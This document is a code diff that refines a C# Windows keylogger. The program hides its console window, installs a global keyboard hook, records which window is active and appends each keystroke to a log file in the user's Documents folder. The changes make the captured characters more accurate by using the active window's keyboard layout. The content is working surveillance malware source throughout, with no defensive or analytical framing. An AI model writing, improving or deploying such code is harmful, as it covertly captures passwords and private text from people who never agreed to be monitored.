@@ -8,11 +8,11 @@ using System.Windows.Forms;
 
 class KeyLogger
 {
-    // Constantes hook
+    // Hook constants
     const int WH_KEYBOARD_LL = 13;
     const int WM_KEYDOWN     = 0x0100;
 
-    // Virtual key codes
+    // Virtual-key codes
     const int VK_SHIFT   = 0x10;
     const int VK_CAPITAL = 0x14;
     const int VK_MENU    = 0x12; // Alt
@@ -29,26 +29,22 @@ class KeyLogger
         // Oculta la consola
         ShowWindow(GetConsoleWindow(), 0);
 
-        // Prepara log en Documentos
-        string logPath = Path.Combine(
+        // Prepara el log en Documentos
+        string path = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
             "log.txt");
-        log = new StreamWriter(new FileStream(logPath, FileMode.Append, FileAccess.Write));
-        log.AutoFlush = true;
+        log = new StreamWriter(new FileStream(path, FileMode.Append, FileAccess.Write))
+        { AutoFlush = true };
 
-        // Instala hook
+        // Instala el hook
         hook = SetHook(HookCallback);
         Application.Run();
         UnhookWindowsHookEx(hook);
         log.Close();
     }
 
-    // ------------------------------------------------
-    //  Instalación del hook global de teclado
-    // ------------------------------------------------
-
+    // Instalación del hook
     delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
     static IntPtr SetHook(LowLevelKeyboardProc proc)
     {
         using (Process p = Process.GetCurrentProcess())
@@ -61,19 +57,17 @@ class KeyLogger
         }
     }
 
-    // ------------------------------------------------
-    //  Callback que se ejecuta en cada pulsación
-    // ------------------------------------------------
-
+    // Callback del hook
     static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
     {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
             int vk = Marshal.ReadInt32(lParam);
 
-            // — Ventana activa —
+            // 1) Ventana activa
+            IntPtr hWnd = GetForegroundWindow();
             StringBuilder sbWin = new StringBuilder(256);
-            GetWindowText(GetForegroundWindow(), sbWin, sbWin.Capacity);
+            GetWindowText(hWnd, sbWin, sbWin.Capacity);
             string win = sbWin.ToString();
             if (win != lastWindow)
             {
@@ -83,19 +77,19 @@ class KeyLogger
                               "] Ventana: " + win);
             }
 
-            // — Estado de Shift / Caps / AltGr —
+            // 2) Estado Shift / Caps / AltGr
             byte[] ks = new byte[256];
             GetKeyboardState(ks);
 
-            bool shift   = (GetKeyState(VK_SHIFT)   & 0x8000) != 0;
-            bool caps    = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-            bool rightAlt= (GetKeyState(VK_RMENU)   & 0x8000) != 0;
-            bool ctrl    = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
-            bool leftAlt = (GetKeyState(VK_MENU)    & 0x8000) != 0;
-            bool altGr   = rightAlt || (ctrl && leftAlt);
+            bool shift    = (GetKeyState(VK_SHIFT)   & 0x8000) != 0;
+            bool caps     = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+            bool rightAlt = (GetKeyState(VK_RMENU)   & 0x8000) != 0;
+            bool ctrl     = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
+            bool leftAlt  = (GetKeyState(VK_MENU)    & 0x8000) != 0;
+            bool altGr    = rightAlt || (ctrl && leftAlt);
 
-            if (shift)    ks[VK_SHIFT]   = 0x80;
-            if (caps)     ks[VK_CAPITAL] = 0x01;
+            if (shift)  ks[VK_SHIFT]   = 0x80;
+            if (caps)   ks[VK_CAPITAL] = 0x01;
             if (altGr)
             {
                 ks[VK_RMENU]   = 0x80;
@@ -103,21 +97,28 @@ class KeyLogger
                 ks[VK_CONTROL] = 0x80;
             }
 
-            // — Llamada a ToUnicodeEx con scanCode real —
-            uint scan = MapVirtualKey((uint)vk, 0);
+            // 3) Keyboard layout de la ventana activa
+            uint procId;
+            uint threadId = GetWindowThreadProcessId(hWnd, out procId);
+            IntPtr hkl = GetKeyboardLayout(threadId);
+
+            // 4) Scan code real en ese layout
+            uint scan = MapVirtualKeyEx((uint)vk, 0, hkl);
+
+            // 5) Traducción con ToUnicodeEx
             StringBuilder buf = new StringBuilder(5);
             int res = ToUnicodeEx(
                 (uint)vk, scan, ks,
                 buf, buf.Capacity, 0,
-                GetKeyboardLayout(0)
+                hkl
             );
             string raw = buf.ToString();
 
-            // — Traducción final —
+            // 6) Decide si usar raw o mapeo manual
             string key;
             if (res > 0 && !string.IsNullOrWhiteSpace(raw) && !char.IsControl(raw[0]))
             {
-                // normaliza mayús/minús si corresponde
+                // Normaliza mayúsculas
                 if (char.IsLetter(raw[0]) && !shift && !caps && char.IsUpper(raw[0]))
                     key = raw.ToLower();
                 else
@@ -134,10 +135,7 @@ class KeyLogger
         return CallNextHookEx(hook, nCode, wParam, lParam);
     }
 
-    // ------------------------------------------------
-    //  Mapea manual dead-keys y AltGr
-    // ------------------------------------------------
-
+    // Mapeo manual dead-keys + AltGr
     static string ManualMap(int vk, bool altGr)
     {
         if (altGr)
@@ -183,55 +181,28 @@ class KeyLogger
         }
     }
 
-    // ------------------------------------------------
-    //  P/Invoke y constantes
-    // ------------------------------------------------
-
-    [DllImport("user32.dll")]
-    static extern IntPtr SetWindowsHookEx(
-        int idHook, LowLevelKeyboardProc lpfn,
-        IntPtr hMod, uint dwThreadId);
-
-    [DllImport("user32.dll")]
-    static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-    [DllImport("user32.dll")]
-    static extern IntPtr CallNextHookEx(
+    // P/Invoke
+    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(
+        int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(
         IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetConsoleWindow();
-
-    [DllImport("user32.dll")]
-    static extern bool ShowWindow(
-        IntPtr hWnd, int nCmdShow);
-
-    [DllImport("user32.dll")]
-    static extern IntPtr GetForegroundWindow();
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
+    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]   static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")]   static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
     static extern int GetWindowText(
-        IntPtr hWnd, StringBuilder lpString, int nMaxCount);
-
-    [DllImport("user32.dll")]
-    static extern bool GetKeyboardState(byte[] lpKeyState);
-
-    [DllImport("user32.dll")]
-    static extern short GetKeyState(int nVirtKey);
-
-    [DllImport("user32.dll")]
-    static extern IntPtr GetKeyboardLayout(uint idThread);
-
-    [DllImport("user32.dll")]
-    static extern int ToUnicodeEx(
+        IntPtr hWnd, StringBuilder text, int maxCount);
+    [DllImport("user32.dll")]   static extern bool GetKeyboardState(byte[] lpKeyState);
+    [DllImport("user32.dll")]   static extern short GetKeyState(int vKey);
+    [DllImport("user32.dll")]   static extern uint  GetWindowThreadProcessId(
+        IntPtr hWnd, out uint lpdwProcessId);
+    [DllImport("user32.dll")]   static extern IntPtr GetKeyboardLayout(uint idThread);
+    [DllImport("user32.dll")]   static extern int    ToUnicodeEx(
         uint wVk, uint wScanCode, byte[] lpKeyState,
-        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
+        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder buf,
         int cchBuff, uint wFlags, IntPtr dwhkl);
-
-    [DllImport("user32.dll")]
-    static extern uint MapVirtualKey(
-        uint uCode, uint uMapType);
+    [DllImport("user32.dll")]   static extern uint   MapVirtualKeyEx(
+        uint uCode, uint uMapType, IntPtr dwhkl);
 }
